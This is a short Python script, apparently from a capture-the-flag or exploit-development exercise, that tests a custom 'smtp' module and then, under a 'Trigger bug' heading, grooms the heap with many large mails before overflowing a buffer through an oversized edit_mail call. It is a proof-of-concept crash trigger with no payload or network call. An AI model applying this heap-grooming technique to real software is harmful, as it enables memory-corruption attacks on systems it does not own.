import smtp
import time
from rich import print
from pwn import p64

print("----- Hello World:")
print(smtp.version())

print("----- Invalid args:")
try:
    print(smtp.gen_mail("woody@mxlwa.re"))
except:
    pass
print("----- Invalid emails:")
print(smtp.gen_mail("woody@mxlware", "woodymxlwa.re", "quoicoubeh", "quoicoubeh"))

print("----- Valid emails:")
print(smtp.gen_mail("woody@mxlwa.re", "woody@mxlwa.re", "quoicoubeh", "quoicoubeh"))

print("----- Trigger bug:")
print("---- Mails:")
print(smtp.show_mails())

for i in range(30):
    smtp.gen_mail("osef@os.ef", "osef@os.ef", str(i), "A" * 1000)

for i in range(10, 20):
    smtp.send_mail(i)

smtp.gen_mail("woody@mxlwa.re", "woody@mxlwa.re", "AAAAAAAAAA", "A" * 6000)
smtp.gen_mail("woody@mxlwa.re", "woody@mxlwa.re", "BBBBBBBBBB", "B" * 6000)
smtp.gen_mail("woody@mxlwa.re", "xptdr@mxlwa.re", "CCCCCCCCCC", "DDDDDD")

print(smtp.show_mails())
print(smtp.edit_mail(11, "i" * 4096 + "A" * 3 + "A" * 16))

smtp.send_mail(11)
